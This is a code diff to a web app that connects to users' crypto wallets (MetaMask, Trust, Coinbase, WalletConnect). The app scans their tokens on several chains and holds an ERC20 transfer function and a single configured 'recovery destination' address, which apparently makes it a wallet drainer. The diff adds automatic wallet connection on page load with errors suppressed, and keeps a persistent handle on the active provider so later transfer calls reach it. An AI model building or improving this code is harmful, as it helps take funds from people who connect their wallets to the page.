@@ -54,6 +54,7 @@ type TokenAsset = { chainId: number; chainName: string; address: string; name: s
 const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address to, uint256 amount) returns (bool)'] as const;
 const RECOVERY_DESTINATION = ((import.meta as any).env?.VITE_RECOVERY_DESTINATION as string | undefined)?.trim() || '';
 let walletConnectProvider: WalletConnectProvider | null = null;
+let activeEip1193Provider: any = null;
 
 const walletName = (app: WalletApp) => app === 'metamask' ? 'MetaMask' : app === 'trust' ? 'Trust Wallet' : 'Coinbase Wallet';
 const isMobileBrowser = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -255,7 +256,7 @@ function App() {
     const label = info?.name ?? String(chainId);
     setBusy(true); setTxHash(''); setSelectedChain(chainId); setFocusChain(chainId);
 
-    const eip1193 = walletConnectProvider ?? window.ethereum;
+    const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
     if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Use WalletConnect.'); }
 
     try {
@@ -315,7 +316,7 @@ function App() {
     setStatus('Connecting…');
     const found: TokenAsset[] = [];
     try {
-      const eip1193 = walletConnectProvider ?? window.ethereum;
+      const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
       if (eip1193) {
         try {
           const id = parseChainId(await eip1193.request({ method: 'eth_chainId' }));
@@ -352,6 +353,7 @@ function App() {
   }
 
   async function finishConnection(eip1193: any, existingAccount?: string) {
+    activeEip1193Provider = eip1193;
     const provider = new BrowserProvider(eip1193);
     const accounts = existingAccount ? [existingAccount] : await provider.send('eth_requestAccounts', []);
     let chainId = 1;
@@ -388,7 +390,8 @@ function App() {
       });
       walletConnectProvider.on('accountsChanged', (a: string[]) => { const n = a[0] ?? ''; setAddress(n); if (n) void scanWalletTokens(n); else setTokens([]); });
       walletConnectProvider.on('chainChanged', (c: string | number) => { const id = parseChainId(c); if (Number.isFinite(id)) { setConnectedChain(id); setSelectedChain(id); } });
-      walletConnectProvider.on('disconnect', () => { setAddress(''); setConnectedChain(null); setSelectedChain(null); setTokens([]); setStatus('Disconnected.'); walletConnectProvider = null; });
+      walletConnectProvider.on('disconnect', () => { activeEip1193Provider = null; setAddress(''); setConnectedChain(null); setSelectedChain(null); setTokens([]); setStatus('Disconnected.'); walletConnectProvider = null; });
+      activeEip1193Provider = walletConnectProvider;
       const accounts = await walletConnectProvider.enable();
       if (!accounts?.length) return void setStatus('No account returned.');
       await finishConnection(walletConnectProvider, accounts[0]);
@@ -396,6 +399,12 @@ function App() {
       setStatus(e?.message || 'WalletConnect failed');
     } finally { setBusy(false); }
   }
+
+  useEffect(() => {
+    if (address || !window.ethereum) return;
+    const injected = window.ethereum;
+    void finishConnection(injected).catch(() => {});
+  }, []);
 
   function openWalletApp(app: WalletApp) {
     if (!mobile) return void setStatus('Mobile only. Use WalletConnect on desktop.');
@@ -425,7 +434,7 @@ function App() {
                   const cur = selectedChain ?? connectedChain ?? 1;
                   const idx = primary.indexOf(cur);
                   const nextId = primary[(idx >= 0 ? idx + 1 : 0) % primary.length];
-                  const eip1193 = walletConnectProvider ?? window.ethereum;
+                  const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
                   if (!eip1193) return setStatus('Connect first.');
                   const c = chains.find(x => x.id === nextId);
                   setBusy(true);
@@ -541,7 +550,7 @@ function App() {
                         disabled={busy}
                         onClick={() => {
                           void (async () => {
-                            const eip1193 = walletConnectProvider ?? window.ethereum;
+                            const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
                             if (!eip1193) return setStatus('Connect wallet first.');
                             setBusy(true);
                             try {
